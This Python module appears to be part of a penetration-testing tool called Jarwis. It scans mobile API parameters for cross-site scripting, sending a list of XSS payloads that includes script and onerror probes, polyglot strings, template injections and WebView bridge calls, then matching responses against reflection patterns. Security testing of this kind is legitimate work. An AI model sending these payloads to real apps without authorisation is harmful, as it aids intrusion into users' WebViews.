"""
Jarwis AGI Pen Test - Mobile XSS Scanner

Detects Cross-Site Scripting vulnerabilities in mobile API responses.
Extends BaseMobileScanner for MITM-first methodology.

OWASP Mobile Top 10 2024: M4 - Insufficient Input/Output Validation
CWE-79: Cross-site Scripting

Mobile-specific considerations:
- XSS in mobile APIs typically affects WebViews
- React Native/Flutter apps may render HTML unsafely
- Push notification content may be vulnerable
- Deep links can carry XSS payloads
"""

import asyncio
import logging
import re
import html
import random
import string
from typing import Dict, List, Optional, Any, Tuple

from attacks.mobile.base_mobile_scanner import (
    BaseMobileScanner,
    MobileFinding,
    Severity,
    Confidence
)
from core.mobile_http_client import MobileHTTPClient, MobileAttackResponse
from core.mobile_request_store import MobileRequestStoreDB, StoredMobileRequest

logger = logging.getLogger(__name__)


class MobileXSSScanner(BaseMobileScanner):
    """
    XSS Scanner for Mobile APIs
    
    Detects XSS vulnerabilities in mobile API responses that could
    affect WebViews or hybrid apps rendering HTML content.
    
    Attack vectors:
    - Reflected XSS in API responses
    - Stored XSS via data submission
    - DOM-based XSS through deep links
    - XSS in push notification content
    """
    
    # Scanner identification
    scanner_name = "mobile_xss"
    attack_type = "xss"
    vuln_type = "xss_reflected"  # Maps to VULN_REGISTRY
    owasp_category = "M4"  # Insufficient Input/Output Validation
    cwe_id = "CWE-79"
    
    # XSS probe payloads with random canary
    XSS_PAYLOADS = [
        # Basic probes
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><svg onload=alert(1)>',
        
        # Event handlers
        '" onmouseover="alert(1)"',
        "' onmouseover='alert(1)'",
        '" onfocus="alert(1)" autofocus="',
        
        # JavaScript URLs (for href attributes)
        'javascript:alert(1)',
        'javascript:alert(1)//',
        
        # HTML entities bypass
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        
        # WebView specific
        '<a href="javascript:alert(1)">click</a>',
        '<iframe src="javascript:alert(1)">',
        
        # Template injection (Angular, React)
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(1)}',
        '#{alert(1)}',
    ]
    
    # Polyglot payloads (work in multiple contexts)
    POLYGLOT_PAYLOADS = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'>><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"</script><script>alert(1)</script>",
    ]
    
    # Mobile-specific payloads
    MOBILE_PAYLOADS = [
        # React Native WebView bypass
        '<script>window.ReactNativeWebView.postMessage("xss")</script>',
        
        # Android WebView bridge
        '<script>Android.showToast("xss")</script>',
        
        # iOS WKWebView
        '<script>webkit.messageHandlers.callback.postMessage("xss")</script>',
        
        # Deep link injection
        'myapp://callback?data=<script>alert(1)</script>',
    ]
    
    # Reflection patterns to detect
    REFLECTION_PATTERNS = [
        r'<script[^>]*>.*?</script>',
        r'<img[^>]*onerror[^>]*>',
        r'<svg[^>]*onload[^>]*>',
        r'javascript:',
        r'on\w+\s*=',
        r'<iframe[^>]*>',
    ]
    
    # Parameters commonly vulnerable to XSS
    PRIORITY_PARAMS = [
        'q', 'query', 'search', 'name', 'title', 'description',
        'message', 'msg', 'text', 'content', 'body', 'comment',
        'subject', 'callback', 'redirect', 'url', 'return', 'next',
        'error', 'err', 'warning', 'info', 'status', 'label'
    ]
    
    def __init__(
        self,
        http_client: MobileHTTPClient,
        request_store: MobileRequestStoreDB,
        use_canary: bool = True,
        test_polyglots: bool = True,
        test_mobile_specific: bool = True,
        **kwargs
    ):
        """
        Initialize Mobile XSS Scanner.
        
        Args:
            http_client: Mobile HTTP client
            request_store: Mobile request store
            use_canary: Use random canary in payloads for accurate detection
            test_polyglots: Include polyglot payloads
            test_mobile_specific: Include mobile-specific payloads
        """
        super().__init__(http_client, request_store, **kwargs)
        self.use_canary = use_canary
        self.test_polyglots = test_polyglots
        self.test_mobile_specific = test_mobile_specific
        
        # Generate session canary
        self._canary = self._generate_canary()
    
    def _generate_canary(self) -> str:
        """Generate random canary string for XSS detection."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    def get_payloads(self) -> List[str]:
        """Return XSS payloads."""
        payloads = self.XSS_PAYLOADS.copy()
        
        if self.test_polyglots:
            payloads.extend(self.POLYGLOT_PAYLOADS)
        
        if self.test_mobile_specific:
            payloads.extend(self.MOBILE_PAYLOADS)
        
        return payloads[:self.max_payloads_per_param]
    
    def is_applicable(self, request: StoredMobileRequest) -> bool:
        """Check if request should be tested for XSS."""
        # Skip static resources
        if request.endpoint_type == 'static':
            return False
        
        # Must have parameters or body
        if not request.parameters and not request.body:
            return False
        
        # Check for JSON responses (most mobile APIs)
        content_type = request.headers.get('Accept', '')
        if 'json' in content_type.lower():
            return True
        
        # Check for parameters that may be reflected
        if request.parameters:
            param_names = [p.lower() for p in request.parameters.keys()]
            return any(p in param_names for p in self.PRIORITY_PARAMS)
        
        return True
    
    async def scan_request(self, request: StoredMobileRequest) -> List[MobileFinding]:
        """
        Scan a request for XSS vulnerabilities.
        
        Flow:
        1. Generate payloads with canary
        2. Test each parameter
        3. Check for reflection in response
        4. Analyze context of reflection
        """
        findings = []
        
        # Get baseline response
        baseline = await self.get_baseline(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] No baseline for {request.url}")
            return findings
        
        # Test each parameter
        for param_name, param_value in (request.parameters or {}).items():
            if self._cancelled:
                break
            
            # Determine injection location
            location = self._get_param_location(request, param_name)
            
            # Test with XSS payloads
            param_findings = await self._test_xss_payloads(
                request, param_name, location, baseline
            )
            findings.extend(param_findings)
            
            if param_findings:
                continue  # Found XSS in this param, skip more tests
            
            # Test with canary for reflection detection
            reflection_finding = await self._test_reflection(
                request, param_name, location, baseline
            )
            if reflection_finding:
                findings.append(reflection_finding)
        
        return findings
    
    async def _test_xss_payloads(
        self,
        request: StoredMobileRequest,
        param_name: str,
        location: str,
        baseline: MobileAttackResponse
    ) -> List[MobileFinding]:
        """Test XSS payloads against a parameter."""
        findings = []
        
        for payload in self.get_payloads():
            # Add canary if enabled
            if self.use_canary:
                payload = payload.replace('alert(1)', f'alert("{self._canary}")')
                payload = payload.replace('alert(/XSS/)', f'alert("{self._canary}")')
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for XSS indicators
            is_xss, context, evidence = self._detect_xss(response, payload)
            
            if is_xss:
                severity = self._determine_severity(context)
                
                findings.append(self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=Confidence.HIGH if context != 'unknown' else Confidence.MEDIUM,
                    severity=severity,
                    title=f"XSS in '{param_name}' ({context})",
                    description=(
                        f"Cross-site scripting vulnerability detected in the "
                        f"'{param_name}' parameter. The payload was reflected "
                        f"in a {context} context without proper sanitization. "
                        f"This could allow execution of arbitrary JavaScript "
                        f"in WebViews or hybrid mobile apps."
                    ),
                    parameter=param_name
                ))
                break  # One finding per parameter
        
        return findings
    
    async def _test_reflection(
        self,
        request: StoredMobileRequest,
        param_name: str,
        location: str,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test for simple reflection that could lead to XSS."""
        
        # Use canary to detect reflection
        canary = f"jarwis{self._canary}xss"
        
        response = await self.send_payload(
            request=request,
            payload=canary,
            location=location,
            parameter_name=param_name
        )
        
        if not response:
            return None
        
        body = response.body or ""
        
        if canary in body:
            # Canary reflected, now check context
            context = self._analyze_context(body, canary)
            
            if context in ['html', 'attribute', 'script', 'url']:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=canary,
                    evidence=f"Input '{canary}' reflected in {context} context",
                    confidence=Confidence.MEDIUM,
                    severity=Severity.MEDIUM,
                    title=f"Reflected Input in '{param_name}' ({context} context)",
                    description=(
                        f"User input is reflected in the response in a {context} "
                        f"context. While not directly exploitable with this payload, "
                        f"this could lead to XSS with proper payload crafting. "
                        f"Parameter: {param_name}"
                    ),
                    parameter=param_name
                )
        
        return None
    
    def _detect_xss(
        self,
        response: MobileAttackResponse,
        payload: str
    ) -> Tuple[bool, str, str]:
        """
        Detect XSS in response.
        
        Returns:
            Tuple of (is_xss, context, evidence)
        """
        body = response.body or ""
        
        # Check if payload is reflected
        if payload not in body:
            # Check for HTML-decoded version
            decoded_payload = html.unescape(payload)
            if decoded_payload not in body:
                return False, "", ""
        
        # Check for dangerous patterns
        for pattern in self.REFLECTION_PATTERNS:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                context = self._determine_context(pattern)
                evidence = f"Payload reflected: {match.group(0)[:100]}"
                return True, context, evidence
        
        # Check for unencoded dangerous characters
        if '<script' in body.lower() or '<img' in body.lower():
            return True, "html", "Unencoded HTML tags in response"
        
        return False, "unknown", ""
    
    def _determine_context(self, pattern: str) -> str:
        """Determine XSS context from pattern."""
        if 'script' in pattern:
            return 'script'
        if 'javascript:' in pattern:
            return 'url'
        if 'on\\w+' in pattern:
            return 'attribute'
        if '<img' in pattern or '<svg' in pattern or '<iframe' in pattern:
            return 'html'
        return 'unknown'
    
    def _analyze_context(self, body: str, canary: str) -> str:
        """Analyze the context where canary appears."""
        idx = body.find(canary)
        if idx == -1:
            return 'unknown'
        
        # Get surrounding context
        start = max(0, idx - 50)
        end = min(len(body), idx + len(canary) + 50)
        context_str = body[start:end]
        
        # Check for HTML context
        if re.search(r'<[^>]*$', body[:idx]) and re.search(r'^[^<]*>', body[idx:]):
            return 'html'
        
        # Check for attribute context
        if re.search(r'[a-z]+=["\']\s*$', body[max(0, idx-20):idx], re.IGNORECASE):
            return 'attribute'
        
        # Check for script context
        if '<script' in body[:idx].lower() and '</script>' in body[idx:].lower():
            return 'script'
        
        # Check for URL context
        if re.search(r'(href|src|action)=["\']', body[max(0, idx-30):idx], re.IGNORECASE):
            return 'url'
        
        # JSON context (common in mobile APIs)
        if '"' in body[max(0, idx-5):idx] and '"' in body[idx:min(len(body), idx+len(canary)+5)]:
            return 'json'
        
        return 'text'
    
    def _determine_severity(self, context: str) -> str:
        """Determine severity based on XSS context."""
        severity_map = {
            'script': Severity.HIGH,
            'html': Severity.HIGH,
            'attribute': Severity.MEDIUM,
            'url': Severity.MEDIUM,
            'json': Severity.LOW,
            'text': Severity.LOW,
            'unknown': Severity.MEDIUM
        }
        return severity_map.get(context, Severity.MEDIUM)
    
    def _get_param_location(
        self,
        request: StoredMobileRequest,
        param_name: str
    ) -> str:
        """Determine parameter location."""
        if '?' in request.url and param_name in request.url:
            return 'query'
        if request.body and param_name in request.body:
            return 'body'
        return 'query' if request.method.upper() == 'GET' else 'body'
